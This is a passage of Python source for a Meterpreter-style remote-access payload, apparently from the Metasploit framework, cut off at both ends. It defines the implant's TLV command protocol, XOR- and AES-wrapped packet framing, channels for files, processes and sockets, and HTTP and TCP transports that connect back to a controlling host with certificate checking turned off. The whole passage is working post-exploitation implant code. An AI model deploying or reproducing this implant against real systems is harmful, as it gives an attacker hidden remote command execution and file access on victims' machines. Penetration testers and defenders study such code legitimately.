    is_bytes = lambda obj: issubclass(obj.__class__, bytes)
    NULL_BYTE = bytes('\x00', 'UTF-8')
    long = int
    unicode = lambda x: (x.decode('UTF-8') if isinstance(x, bytes) else x)

# reseed the random generator.
random.seed()

#
# Constants
#

# these values will be patched, DO NOT CHANGE THEM
DEBUGGING = False
TRY_TO_FORK = True
HTTP_CONNECTION_URL = None
HTTP_PROXY = None
HTTP_USER_AGENT = None
HTTP_COOKIE = None
HTTP_HOST = None
HTTP_REFERER = None
PAYLOAD_UUID = ''
SESSION_GUID = ''
SESSION_COMMUNICATION_TIMEOUT = 300
SESSION_EXPIRATION_TIMEOUT = 604800
SESSION_RETRY_TOTAL = 3600
SESSION_RETRY_WAIT = 10

PACKET_TYPE_REQUEST        = 0
PACKET_TYPE_RESPONSE       = 1
PACKET_TYPE_PLAIN_REQUEST  = 10
PACKET_TYPE_PLAIN_RESPONSE = 11

ERROR_SUCCESS = 0
# not defined in original C implementation
ERROR_FAILURE = 1
ERROR_FAILURE_PYTHON = 2
ERROR_FAILURE_WINDOWS = 3

CHANNEL_CLASS_BUFFERED = 0
CHANNEL_CLASS_STREAM   = 1
CHANNEL_CLASS_DATAGRAM = 2
CHANNEL_CLASS_POOL     = 3

#
# TLV Meta Types
#
TLV_META_TYPE_NONE       = (   0   )
TLV_META_TYPE_STRING     = (1 << 16)
TLV_META_TYPE_UINT       = (1 << 17)
TLV_META_TYPE_RAW        = (1 << 18)
TLV_META_TYPE_BOOL       = (1 << 19)
TLV_META_TYPE_QWORD      = (1 << 20)
TLV_META_TYPE_COMPRESSED = (1 << 29)
TLV_META_TYPE_GROUP      = (1 << 30)
TLV_META_TYPE_COMPLEX    = (1 << 31)
# not defined in original
TLV_META_TYPE_MASK = (1<<31)+(1<<30)+(1<<29)+(1<<19)+(1<<18)+(1<<17)+(1<<16)

#
# TLV base starting points
#
TLV_RESERVED   = 0
TLV_EXTENSIONS = 20000
TLV_USER       = 40000
TLV_TEMP       = 60000

#
# TLV Specific Types
#
TLV_TYPE_ANY                   = TLV_META_TYPE_NONE    | 0
TLV_TYPE_METHOD                = TLV_META_TYPE_STRING  | 1
TLV_TYPE_REQUEST_ID            = TLV_META_TYPE_STRING  | 2
TLV_TYPE_EXCEPTION             = TLV_META_TYPE_GROUP   | 3
TLV_TYPE_RESULT                = TLV_META_TYPE_UINT    | 4

TLV_TYPE_STRING                = TLV_META_TYPE_STRING  | 10
TLV_TYPE_UINT                  = TLV_META_TYPE_UINT    | 11
TLV_TYPE_BOOL                  = TLV_META_TYPE_BOOL    | 12

TLV_TYPE_LENGTH                = TLV_META_TYPE_UINT    | 25
TLV_TYPE_DATA                  = TLV_META_TYPE_RAW     | 26
TLV_TYPE_FLAGS                 = TLV_META_TYPE_UINT    | 27

TLV_TYPE_CHANNEL_ID            = TLV_META_TYPE_UINT    | 50
TLV_TYPE_CHANNEL_TYPE          = TLV_META_TYPE_STRING  | 51
TLV_TYPE_CHANNEL_DATA          = TLV_META_TYPE_RAW     | 52
TLV_TYPE_CHANNEL_DATA_GROUP    = TLV_META_TYPE_GROUP   | 53
TLV_TYPE_CHANNEL_CLASS         = TLV_META_TYPE_UINT    | 54
TLV_TYPE_CHANNEL_PARENTID      = TLV_META_TYPE_UINT    | 55

TLV_TYPE_SEEK_WHENCE           = TLV_META_TYPE_UINT    | 70
TLV_TYPE_SEEK_OFFSET           = TLV_META_TYPE_UINT    | 71
TLV_TYPE_SEEK_POS              = TLV_META_TYPE_UINT    | 72

TLV_TYPE_EXCEPTION_CODE        = TLV_META_TYPE_UINT    | 300
TLV_TYPE_EXCEPTION_STRING      = TLV_META_TYPE_STRING  | 301

TLV_TYPE_LIBRARY_PATH          = TLV_META_TYPE_STRING  | 400
TLV_TYPE_TARGET_PATH           = TLV_META_TYPE_STRING  | 401

TLV_TYPE_TRANS_TYPE            = TLV_META_TYPE_UINT    | 430
TLV_TYPE_TRANS_URL             = TLV_META_TYPE_STRING  | 431
TLV_TYPE_TRANS_UA              = TLV_META_TYPE_STRING  | 432
TLV_TYPE_TRANS_COMM_TIMEOUT    = TLV_META_TYPE_UINT    | 433
TLV_TYPE_TRANS_SESSION_EXP     = TLV_META_TYPE_UINT    | 434
TLV_TYPE_TRANS_CERT_HASH       = TLV_META_TYPE_RAW     | 435
TLV_TYPE_TRANS_PROXY_HOST      = TLV_META_TYPE_STRING  | 436
TLV_TYPE_TRANS_PROXY_USER      = TLV_META_TYPE_STRING  | 437
TLV_TYPE_TRANS_PROXY_PASS      = TLV_META_TYPE_STRING  | 438
TLV_TYPE_TRANS_RETRY_TOTAL     = TLV_META_TYPE_UINT    | 439
TLV_TYPE_TRANS_RETRY_WAIT      = TLV_META_TYPE_UINT    | 440
TLV_TYPE_TRANS_HEADERS         = TLV_META_TYPE_STRING  | 441
TLV_TYPE_TRANS_GROUP           = TLV_META_TYPE_GROUP   | 442

TLV_TYPE_MACHINE_ID            = TLV_META_TYPE_STRING  | 460
TLV_TYPE_UUID                  = TLV_META_TYPE_RAW     | 461
TLV_TYPE_SESSION_GUID          = TLV_META_TYPE_RAW     | 462

TLV_TYPE_RSA_PUB_KEY           = TLV_META_TYPE_STRING  | 550
TLV_TYPE_SYM_KEY_TYPE          = TLV_META_TYPE_UINT    | 551
TLV_TYPE_SYM_KEY               = TLV_META_TYPE_RAW     | 552
TLV_TYPE_ENC_SYM_KEY           = TLV_META_TYPE_RAW     | 553

TLV_TYPE_PEER_HOST             = TLV_META_TYPE_STRING  | 1500
TLV_TYPE_PEER_PORT             = TLV_META_TYPE_UINT    | 1501
TLV_TYPE_LOCAL_HOST            = TLV_META_TYPE_STRING  | 1502
TLV_TYPE_LOCAL_PORT            = TLV_META_TYPE_UINT    | 1503

EXPORTED_SYMBOLS = {}
EXPORTED_SYMBOLS['DEBUGGING'] = DEBUGGING

# Packet header sizes
PACKET_XOR_KEY_SIZE = 4
PACKET_SESSION_GUID_SIZE = 16
PACKET_ENCRYPT_FLAG_SIZE = 4
PACKET_LENGTH_SIZE = 4
PACKET_TYPE_SIZE = 4
PACKET_ENCRYPT_OFF = (PACKET_XOR_KEY_SIZE + PACKET_SESSION_GUID_SIZE)
PACKET_LENGTH_OFF = (PACKET_XOR_KEY_SIZE + PACKET_SESSION_GUID_SIZE +
        PACKET_ENCRYPT_FLAG_SIZE)
PACKET_HEADER_SIZE = (PACKET_XOR_KEY_SIZE + PACKET_SESSION_GUID_SIZE +
        PACKET_ENCRYPT_FLAG_SIZE + PACKET_LENGTH_SIZE + PACKET_TYPE_SIZE)

ENC_NONE = 0
ENC_AES256 = 1
AES_BLOCK_SIZE = 16
AES_KEY_SIZE = 32

class SYSTEM_INFO(ctypes.Structure):
    _fields_ = [("wProcessorArchitecture", ctypes.c_uint16),
        ("wReserved", ctypes.c_uint16),
        ("dwPageSize", ctypes.c_uint32),
        ("lpMinimumApplicationAddress", ctypes.c_void_p),
        ("lpMaximumApplicationAddress", ctypes.c_void_p),
        ("dwActiveProcessorMask", ctypes.c_uint32),
        ("dwNumberOfProcessors", ctypes.c_uint32),
        ("dwProcessorType", ctypes.c_uint32),
        ("dwAllocationGranularity", ctypes.c_uint32),
        ("wProcessorLevel", ctypes.c_uint16),
        ("wProcessorRevision", ctypes.c_uint16)]

def rand_xor_key():
    return tuple(random.randint(1, 255) for _ in range(4))

def xor_bytes(key, data):
    if sys.version_info[0] < 3:
        dexored = ''.join(chr(ord(data[i]) ^ key[i % len(key)]) for i in range(len(data)))
    else:
        dexored = bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))
    return dexored

def export(symbol):
    EXPORTED_SYMBOLS[symbol.__name__] = symbol
    return symbol

def generate_request_id():
    chars = 'abcdefghijklmnopqrstuvwxyz'
    return ''.join(random.choice(chars) for x in range(32))

@export
def crc16(data):
    poly = 0x1021
    reg = 0x0000
    if is_str(data):
        data = list(map(ord, data))
    elif is_bytes(data):
        data = list(data)
    data.append(0)
    data.append(0)
    for byte in data:
        mask = 0x80
        while mask > 0:
            reg <<= 1
            if byte & mask:
                reg += 1
            mask >>= 1
            if reg > 0xffff:
                reg &= 0xffff
                reg ^= poly
    return reg

@export
def debug_print(msg):
    if DEBUGGING:
        print(msg)

@export
def debug_traceback(msg=None):
    if DEBUGGING:
        if msg:
            print(msg)
        traceback.print_exc(file=sys.stderr)

@export
def error_result(exception=None):
    if not exception:
        _, exception, _ = sys.exc_info()
    exception_crc = crc16(exception.__class__.__name__)
    if exception_crc == 0x4cb2: # WindowsError
        return error_result_windows(exception.errno)
    else:
        result = ((exception_crc << 16) | ERROR_FAILURE_PYTHON)
    return result

@export
def error_result_windows(error_number=None):
    if not has_windll:
        return ERROR_FAILURE
    if error_number == None:
        error_number = ctypes.windll.kernel32.GetLastError()
    if error_number > 0xffff:
        return ERROR_FAILURE
    result = ((error_number << 16) | ERROR_FAILURE_WINDOWS)
    return result

@export
def get_hdd_label():
    for _, _, files in os.walk('/dev/disk/by-id/'):
        for f in files:
            for p in ['ata-', 'mb-']:
                if f[:len(p)] == p:
                    return f[len(p):]
    return ''

@export
def get_native_arch():
    arch = get_system_arch()
    if arch == 'x64' and ctypes.sizeof(ctypes.c_void_p) == 4:
        arch = 'x86'
    return arch

@export
def get_system_arch():
    uname_info = platform.uname()
    arch = uname_info[4]
    if has_windll:
        sysinfo = SYSTEM_INFO()
        ctypes.windll.kernel32.GetNativeSystemInfo(ctypes.byref(sysinfo))
        values = {0:'x86', 5:'armle', 6:'IA64', 9:'x64'}
        arch = values.get(sysinfo.wProcessorArchitecture, uname_info[4])
    if arch == 'x86_64':
        arch = 'x64'
    return arch

@export
def inet_pton(family, address):
    if family == socket.AF_INET6 and '%' in address:
        address = address.split('%', 1)[0]
    if hasattr(socket, 'inet_pton'):
        return socket.inet_pton(family, address)
    elif has_windll:
        WSAStringToAddress = ctypes.windll.ws2_32.WSAStringToAddressA
        lpAddress = (ctypes.c_ubyte * 28)()
        lpAddressLength = ctypes.c_int(ctypes.sizeof(lpAddress))
        if WSAStringToAddress(address, family, None, ctypes.byref(lpAddress), ctypes.byref(lpAddressLength)) != 0:
            raise Exception('WSAStringToAddress failed')
        if family == socket.AF_INET:
            return ''.join(map(chr, lpAddress[4:8]))
        elif family == socket.AF_INET6:
            return ''.join(map(chr, lpAddress[8:24]))
    raise Exception('no suitable inet_pton functionality is available')

@export
def packet_enum_tlvs(pkt, tlv_type=None):
    offset = 0
    while offset < len(pkt):
        tlv = struct.unpack('>II', pkt[offset:offset + 8])
        if tlv_type is None or (tlv[1] & ~TLV_META_TYPE_COMPRESSED) == tlv_type:
            val = pkt[offset + 8:(offset + 8 + (tlv[0] - 8))]
            if (tlv[1] & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING:
                val = str(val.split(NULL_BYTE, 1)[0])
            elif (tlv[1] & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT:
                val = struct.unpack('>I', val)[0]
            elif (tlv[1] & TLV_META_TYPE_QWORD) == TLV_META_TYPE_QWORD:
                val = struct.unpack('>Q', val)[0]
            elif (tlv[1] & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL:
                val = bool(struct.unpack('b', val)[0])
            elif (tlv[1] & TLV_META_TYPE_RAW) == TLV_META_TYPE_RAW:
                pass
            yield {'type': tlv[1], 'length': tlv[0], 'value': val}
        offset += tlv[0]
    return

@export
def packet_get_tlv(pkt, tlv_type):
    try:
        tlv = list(packet_enum_tlvs(pkt, tlv_type))[0]
    except IndexError:
        return {}
    return tlv

@export
def tlv_pack(*args):
    if len(args) == 2:
        tlv = {'type':args[0], 'value':args[1]}
    else:
        tlv = args[0]
    data = ''
    value = tlv['value']
    if (tlv['type'] & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT:
        if isinstance(value, float):
            value = int(round(value))
        data = struct.pack('>III', 12, tlv['type'], value)
    elif (tlv['type'] & TLV_META_TYPE_QWORD) == TLV_META_TYPE_QWORD:
        data = struct.pack('>IIQ', 16, tlv['type'], value)
    elif (tlv['type'] & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL:
        data = struct.pack('>II', 9, tlv['type']) + bytes(chr(int(bool(value))), 'UTF-8')
    else:
        if sys.version_info[0] < 3 and value.__class__.__name__ == 'unicode':
            value = value.encode('UTF-8')
        elif not is_bytes(value):
            value = bytes(value, 'UTF-8')
        if (tlv['type'] & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING:
            data = struct.pack('>II', 8 + len(value) + 1, tlv['type']) + value + NULL_BYTE
        elif (tlv['type'] & TLV_META_TYPE_RAW) == TLV_META_TYPE_RAW:
            data = struct.pack('>II', 8 + len(value), tlv['type']) + value
        elif (tlv['type'] & TLV_META_TYPE_GROUP) == TLV_META_TYPE_GROUP:
            data = struct.pack('>II', 8 + len(value), tlv['type']) + value
        elif (tlv['type'] & TLV_META_TYPE_COMPLEX) == TLV_META_TYPE_COMPLEX:
            data = struct.pack('>II', 8 + len(value), tlv['type']) + value
    return data

@export
def tlv_pack_request(method, parts=None):
    pkt  = struct.pack('>I', PACKET_TYPE_REQUEST)
    pkt += tlv_pack(TLV_TYPE_METHOD, method)
    pkt += tlv_pack(TLV_TYPE_UUID, binascii.a2b_hex(bytes(PAYLOAD_UUID, 'UTF-8')))
    pkt += tlv_pack(TLV_TYPE_REQUEST_ID, generate_request_id())
    parts = parts or []
    for part in parts:
        pkt += tlv_pack(part['type'], part['value'])
    return pkt

#@export
class MeterpreterChannel(object):
    def core_close(self, request, response):
        self.close()
        return ERROR_SUCCESS, response

    def core_eof(self, request, response):
        response += tlv_pack(TLV_TYPE_BOOL, self.eof())
        return ERROR_SUCCESS, response

    def core_read(self, request, response):
        length = packet_get_tlv(request, TLV_TYPE_LENGTH)['value']
        response += tlv_pack(TLV_TYPE_CHANNEL_DATA, self.read(length))
        return ERROR_SUCCESS, response

    def core_write(self, request, response):
        channel_data = packet_get_tlv(request, TLV_TYPE_CHANNEL_DATA)['value']
        response += tlv_pack(TLV_TYPE_LENGTH, self.write(channel_data))
        return ERROR_SUCCESS, response

    def close(self):
        raise NotImplementedError()

    def eof(self):
        return False

    def is_alive(self):
        return True

    def notify(self):
        return None

    def read(self, length):
        raise NotImplementedError()

    def write(self, data):
        raise NotImplementedError()

#@export
class MeterpreterFile(MeterpreterChannel):
    def __init__(self, file_obj):
        self.file_obj = file_obj
        super(MeterpreterFile, self).__init__()

    def close(self):
        self.file_obj.close()

    def eof(self):
        return self.file_obj.tell() >= os.fstat(self.file_obj.fileno()).st_size

    def read(self, length):
        return self.file_obj.read(length)

    def write(self, data):
        self.file_obj.write(data)
        return len(data)
export(MeterpreterFile)

#@export
class MeterpreterProcess(MeterpreterChannel):
    def __init__(self, proc_h):
        self.proc_h = proc_h
        super(MeterpreterProcess, self).__init__()

    def close(self):
        self.proc_h.kill()
        if hasattr(self.proc_h.stdin, 'close'):
            self.proc_h.stdin.close()
        if hasattr(self.proc_h.stdout, 'close'):
            self.proc_h.stdout.close()
        if hasattr(self.proc_h.stderr, 'close'):
            self.proc_h.stderr.close()

    def is_alive(self):
        return self.proc_h.poll() is None

    def read(self, length):
        data = ''
        stdout_reader = self.proc_h.stdout_reader
        if stdout_reader.is_read_ready():
            data = stdout_reader.read(length)
        return data

    def write(self, data):
        self.proc_h.write(data)
        return len(data)
export(MeterpreterProcess)

#@export
class MeterpreterSocket(MeterpreterChannel):
    def __init__(self, sock):
        self.sock = sock
        self._is_alive = True
        super(MeterpreterSocket, self).__init__()

    def core_write(self, request, response):
        try:
            status, response = super(MeterpreterSocket, self).core_write(request, response)
        except socket.error:
            self.close()
            self._is_alive = False
            status = ERROR_FAILURE
        return status, response

    def close(self):
        return self.sock.close()

    def fileno(self):
        return self.sock.fileno()

    def is_alive(self):
        return self._is_alive

    def read(self, length):
        return self.sock.recv(length)

    def write(self, data):
        return self.sock.send(data)
export(MeterpreterSocket)

#@export
class MeterpreterSocketTCPClient(MeterpreterSocket):
    pass
export(MeterpreterSocketTCPClient)

#@export
class MeterpreterSocketTCPServer(MeterpreterSocket):
    pass
export(MeterpreterSocketTCPServer)

#@export
class MeterpreterSocketUDPClient(MeterpreterSocket):
    def __init__(self, sock, peer_address=None):
        super(MeterpreterSocketUDPClient, self).__init__(sock)
        self.peer_address = peer_address

    def core_write(self, request, response):
        peer_host = packet_get_tlv(request, TLV_TYPE_PEER_HOST).get('value')
        peer_port = packet_get_tlv(request, TLV_TYPE_PEER_PORT).get('value')
        if peer_host and peer_port:
            peer_address = (peer_host, peer_port)
        elif self.peer_address:
            peer_address = self.peer_address
        else:
            raise RuntimeError('peer_host and peer_port must be specified with an unbound/unconnected UDP channel')
        channel_data = packet_get_tlv(request, TLV_TYPE_CHANNEL_DATA)['value']
        try:
            length = self.sock.sendto(channel_data, peer_address)
        except socket.error:
            self.close()
            self._is_alive = False
            status = ERROR_FAILURE
        else:
            response += tlv_pack(TLV_TYPE_LENGTH, length)
            status = ERROR_SUCCESS
        return status, response

    def read(self, length):
        return self.sock.recvfrom(length)[0]

    def write(self, data):
        self.sock.sendto(data, self.peer_address)
export(MeterpreterSocketUDPClient)

class STDProcessBuffer(threading.Thread):
    def __init__(self, std, is_alive):
        threading.Thread.__init__(self)
        self.std = std
        self.is_alive = is_alive
        self.data = bytes()
        self.data_lock = threading.RLock()

    def run(self):
        for byte in iter(lambda: self.std.read(1), bytes()):
            self.data_lock.acquire()
            self.data += byte
            self.data_lock.release()

    def is_read_ready(self):
        return len(self.data) != 0

    def peek(self, l = None):
        data = bytes()
        self.data_lock.acquire()
        if l == None:
            data = self.data
        else:
            data = self.data[0:l]
        self.data_lock.release()
        return data

    def read(self, l = None):
        self.data_lock.acquire()
        data = self.peek(l)
        self.data = self.data[len(data):]
        self.data_lock.release()
        return data

#@export
class STDProcess(subprocess.Popen):
    def __init__(self, *args, **kwargs):
        debug_print('[*] starting process: ' + repr(args[0]))
        subprocess.Popen.__init__(self, *args, **kwargs)
        self.echo_protection = False

    def is_alive(self):
        return self.poll() is None

    def start(self):
        self.stdout_reader = STDProcessBuffer(self.stdout, self.is_alive)
        self.stdout_reader.start()
        self.stderr_reader = STDProcessBuffer(self.stderr, self.is_alive)
        self.stderr_reader.start()

    def write(self, channel_data):
        length = self.stdin.write(channel_data)
        self.stdin.flush()
        if self.echo_protection:
            end_time = time.time() + 0.5
            out_data = bytes()
            while (time.time() < end_time) and (out_data != channel_data):
                if self.stdout_reader.is_read_ready():
                    out_data = self.stdout_reader.peek(len(channel_data))
            if out_data == channel_data:
                self.stdout_reader.read(len(channel_data))
        return length
export(STDProcess)

class Transport(object):
    def __init__(self):
        self.communication_timeout = SESSION_COMMUNICATION_TIMEOUT
        self.communication_last = 0
        self.retry_total = SESSION_RETRY_TOTAL
        self.retry_wait = SESSION_RETRY_WAIT
        self.request_retire = False

    def __repr__(self):
        return "<{0} url='{1}' >".format(self.__class__.__name__, self.url)

    @property
    def communication_has_expired(self):
        return self.communication_last + self.communication_timeout < time.time()

    @property
    def should_retire(self):
        return self.communication_has_expired or self.request_retire

    @staticmethod
    def from_request(request):
        url = packet_get_tlv(request, TLV_TYPE_TRANS_URL)['value']
        if url.startswith('tcp'):
            transport = TcpTransport(url)
        elif url.startswith('http'):
            proxy = packet_get_tlv(request, TLV_TYPE_TRANS_PROXY_HOST).get('value')
            user_agent = packet_get_tlv(request, TLV_TYPE_TRANS_UA).get('value', HTTP_USER_AGENT)
            http_headers = packet_get_tlv(request, TLV_TYPE_TRANS_HEADERS).get('value', None)
            transport = HttpTransport(url, proxy=proxy, user_agent=user_agent)
            if http_headers:
                headers = {}
                for h in http_headers.strip().split("\r\n"):
                    p = h.split(':')
                    headers[p[0].upper()] = ''.join(p[1:0])
                http_host = headers.get('HOST')
                http_cookie = headers.get('COOKIE')
                http_referer = headers.get('REFERER')
                transport = HttpTransport(url, proxy=proxy, user_agent=user_agent, http_host=http_host,
                        http_cookie=http_cookie, http_referer=http_referer)
        transport.communication_timeout = packet_get_tlv(request, TLV_TYPE_TRANS_COMM_TIMEOUT).get('value', SESSION_COMMUNICATION_TIMEOUT)
        transport.retry_total = packet_get_tlv(request, TLV_TYPE_TRANS_RETRY_TOTAL).get('value', SESSION_RETRY_TOTAL)
        transport.retry_wait = packet_get_tlv(request, TLV_TYPE_TRANS_RETRY_WAIT).get('value', SESSION_RETRY_WAIT)
        return transport

    def _activate(self):
        return True

    def activate(self):
        end_time = time.time() + self.retry_total
        while time.time() < end_time:
            try:
                activate_succeeded = self._activate()
            except:
                activate_succeeded = False
            if activate_succeeded:
                self.communication_last = time.time()
                return True
            time.sleep(self.retry_wait)
        return False

    def _deactivate(self):
        return

    def deactivate(self):
        try:
            self._deactivate()
        except:
            pass
        self.communication_last = 0
        return True

    def decrypt_packet(self, pkt, aes_key = None):
        if pkt and len(pkt) > PACKET_HEADER_SIZE:
            xor_key = struct.unpack('BBBB', pkt[:PACKET_XOR_KEY_SIZE])
            raw = xor_bytes(xor_key, pkt)
            enc_flags = struct.unpack('>I', raw[PACKET_ENCRYPT_OFF:][:PACKET_ENCRYPT_FLAG_SIZE])[0]
            raw = raw[PACKET_HEADER_SIZE:]
            if enc_flags == ENC_AES256 and aes_key:
                iv = raw[:AES_BLOCK_SIZE]
                ciphertext = raw[len(iv):]
                decrypter = pyaes.Decrypter(pyaes.AESModeOfOperationCBC(aes_key, iv))
                raw = decrypter.feed(ciphertext)
                raw += decrypter.feed()
            return raw
        return None

    def get_packet(self, aes_key = None):
        self.request_retire = False
        try:
            pkt = self.decrypt_packet(self._get_packet(), aes_key)
        except:
            debug_traceback()
            return None
        if pkt is None:
            return None
        self.communication_last = time.time()
        return pkt

    def encrypt_packet(self, pkt, aes_key = None):
        xor_key = rand_xor_key()
        raw = binascii.a2b_hex(bytes(SESSION_GUID, 'UTF-8'))

        if aes_key:
            enc = bytes(os.urandom(AES_BLOCK_SIZE))
            encrypter = pyaes.Encrypter(pyaes.AESModeOfOperationCBC(aes_key, enc))
            enc += encrypter.feed(bytes(pkt[8:]))
            enc += encrypter.feed()
            raw += struct.pack('>II', ENC_AES256, len(enc) + 8) + pkt[4:8] + enc
        else:
            raw += struct.pack('>I', ENC_NONE) + pkt

        result = struct.pack('BBBB', *xor_key) + xor_bytes(xor_key, raw)
        return result

    def send_packet(self, pkt, aes_key = None):
        pkt = struct.pack('>I', len(pkt) + 4) + pkt
        self.request_retire = False
        try:
            self._send_packet(self.encrypt_packet(pkt, aes_key))
        except:
            debug_traceback()
            return False
        self.communication_last = time.time()
        return True

    def tlv_pack_timeouts(self):
        response  = tlv_pack(TLV_TYPE_TRANS_COMM_TIMEOUT, self.communication_timeout)
        response += tlv_pack(TLV_TYPE_TRANS_RETRY_TOTAL, self.retry_total)
        response += tlv_pack(TLV_TYPE_TRANS_RETRY_WAIT, self.retry_wait)
        return response

    def tlv_pack_transport_group(self):
        trans_group  = tlv_pack(TLV_TYPE_TRANS_URL, self.url)
        trans_group += self.tlv_pack_timeouts()
        return trans_group

class HttpTransport(Transport):
    def __init__(self, url, proxy=None, user_agent=None, http_host=None, http_referer=None, http_cookie=None):
        super(HttpTransport, self).__init__()
        opener_args = []
        scheme = url.split(':', 1)[0]
        if scheme == 'https' and ((sys.version_info[0] == 2 and sys.version_info >= (2, 7, 9)) or sys.version_info >= (3, 4, 3)):
            import ssl
            ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
            ssl_ctx.check_hostname = False
            ssl_ctx.verify_mode = ssl.CERT_NONE
            opener_args.append(urllib.HTTPSHandler(0, ssl_ctx))
        if proxy:
            opener_args.append(urllib.ProxyHandler({scheme: proxy}))
        self.proxy = proxy
        opener = urllib.build_opener(*opener_args)
        opener.addheaders = []
        if user_agent:
            opener.addheaders.append(('User-Agent', user_agent))
        if http_cookie:
            opener.addheaders.append(('Cookie', http_cookie))
        if http_referer:
            opener.addheaders.append(('Referer', http_referer))
        self.user_agent = user_agent
        urllib.install_opener(opener)
        self.url = url
        self._http_request_headers = {'Content-Type': 'application/octet-stream'}
        if http_host:
            self._http_request_headers['Host'] = http_host
        self._first_packet = None
        self._empty_cnt = 0

    def _activate(self):
        return True
        self._first_packet = None
        packet = self._get_packet()
        if packet is None:
            return False
        self._first_packet = packet
        return True

    def _get_packet(self):
        if self._first_packet:
            packet = self._first_packet
            self._first_packet = None
            return packet
        packet = None
        xor_key = None
        request = urllib.Request(self.url, None, self._http_request_headers)
        try:
            url_h = urllib.urlopen(request, timeout=self.communication_timeout)
            packet = url_h.read()
            for _ in range(1):
                if packet == '':
                    break
                if len(packet) < PACKET_HEADER_SIZE:
                    packet = None  # looks corrupt
                    break
                xor_key = struct.unpack('BBBB', packet[:PACKET_XOR_KEY_SIZE])
                header = xor_bytes(xor_key, packet[:PACKET_HEADER_SIZE])
                pkt_length = struct.unpack('>I', header[PACKET_LENGTH_OFF:PACKET_LENGTH_OFF+PACKET_LENGTH_SIZE])[0] - 8
                if len(packet) != (pkt_length + PACKET_HEADER_SIZE):
                    packet = None  # looks corrupt
        except:
            debug_traceback('Failure to receive packet from ' + self.url)

        if not packet:
            delay = 10 * self._empty_cnt
            if self._empty_cnt >= 0:
                delay *= 10
            self._empty_cnt += 1
            time.sleep(float(min(10000, delay)) / 1000)
            return packet

        self._empty_cnt = 0
        return packet

    def _send_packet(self, packet):
        request = urllib.Request(self.url, packet, self._http_request_headers)
        url_h = urllib.urlopen(request, timeout=self.communication_timeout)
        response = url_h.read()

    def patch_uri_path(self, new_path):
        match = re.match(r'https?://[^/]+(/.*$)', self.url)
        if match is None:
            return False
        self.url = self.url[:match.span(1)[0]] + new_path
        return True

    def tlv_pack_transport_group(self):
        trans_group  = super(HttpTransport, self).tlv_pack_transport_group()
        if self.user_agent:
            trans_group += tlv_pack(TLV_TYPE_TRANS_UA, self.user_agent)
        if self.proxy:
            trans_group += tlv_pack(TLV_TYPE_TRANS_PROXY_HOST, self.proxy)
        return trans_group

class TcpTransport(Transport):
    def __init__(self, url, socket=None):
        super(TcpTransport, self).__init__()
        self.url = url
        self.socket = socket
        self._cleanup_thread = None
        self._first_packet = True

    def _sock_cleanup(self, sock):
        remaining_time = self.communication_timeout
        while remaining_time > 0:
            iter_start_time = time.time()
            if select.select([sock], [], [], remaining_time)[0]:
                if len(sock.recv(4096)) == 0:
                    break
            remaining_time -= time.time() - iter_start_time
        sock.close()

    def _activate(self):
        address, port = self.url[6:].rsplit(':', 1)
        port = int(port.rstrip('/'))
        timeout = max(self.communication_timeout, 30)
        if address in ('', '0.0.0.0', '::'):
            try:
                server_sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
                server_sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
            except (AttributeError, socket.error):
                server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_sock.bind(('', port))
            server_sock.listen(1)
            if not select.select([server_sock], [], [], timeout)[0]:
                server_sock.close()
                return False
            sock, _ = server_sock.accept()
            server_sock.close()
        else:
            if ':' in address:
                sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((address, port))
            sock.settimeout(None)
        self.socket = sock
        self._first_packet = True
        return True

    def _deactivate(self):
        cleanup = threading.Thread(target=self._sock_cleanup, args=(self.socket,))
        cleanup.run()
        self.socket = None

    def _get_packet(self):
        first = self._first_packet
        self._first_packet = False
        if not select.select([self.socket], [], [], 0.5)[0]:
            return bytes()
        packet = self.socket.recv(PACKET_HEADER_SIZE)
        if packet == '':  # remote is closed
            self.request_retire = True
            return None
        if len(packet) != PACKET_HEADER_SIZE:
            if first and len(packet) == 4:
                received = 0
                header = packet[:4]
                pkt_length = struct.unpack('>I', header)[0]
                self.socket.settimeout(max(self.communication_timeout, 30))
                while received < pkt_length:
                    received += len(self.socket.recv(pkt_length - received))
                self.socket.settimeout(None)
                return self._get_packet()
            return None

        xor_key = struct.unpack('BBBB', packet[:PACKET_XOR_KEY_SIZE])
        # XOR the whole header first
        header = xor_bytes(xor_key, packet[:PACKET_HEADER_SIZE])
        # Extract just the length
        pkt_length = struct.unpack('>I', header[PACKET_LENGTH_OFF:PACKET_LENGTH_OFF+PACKET_LENGTH_SIZE])[0]
        pkt_length -= 8
        # Read the rest of the packet
        rest = bytes()
        while len(rest) < pkt_length:
            rest += self.socket.recv(pkt_length - len(rest))
        # return the whole packet, as it's decoded separately
        return packet + rest

    def _send_packet(self, packet):
        self.socket.send(packet)

    @classmethod
    def from_socket(cls, sock):
        url = 'tcp://'
        address, port = sock.getsockname()[:2]
        # this will need to be changed if the bind stager ever supports binding to a specific address
        if not address in ('', '0.0.0.0', '::'):
            address, port = sock.getpeername()[:2]
        url += address + ':' + str(port)
        return cls(url, sock)

class PythonMeterpreter(object):
    def __init__(self, transport):
        self.transport = transport
        self._transport_sleep = None
        self.running = False
        self.last_registered_extension = None
        self.extension_functions = {}
        self.channels = {}
        self.next_channel_id = 1
        self.interact_channels = []
        self.processes = {}
        self.next_process_id = 1
        self.transports = [self.transport]
        self.session_expiry_time = SESSION_EXPIRATION_TIMEOUT
        self.session_expiry_end = time.time() + self.session_expiry_time
        self.aes_key = None
        self.aes_enabled = False
        for func in list(filter(lambda x: x.startswith('_core'), dir(self))):
            self.extension_functions[func[1:]] = getattr(self, func)
        self.running = True

    def register_extension(self, extension_name):
        self.last_registered_extension = extension_name
        return self.last_registered_extension

    def register_function(self, func):
        self.extension_functions[func.__name__] = func
        return func

    def register_function_if(self, condition):
        if condition:
            return self.register_function
        else:
            return lambda function: function

    def register_function_windll(self, func):
        if has_windll:
            self.register_function(func)
        return func

    def add_channel(self, channel):
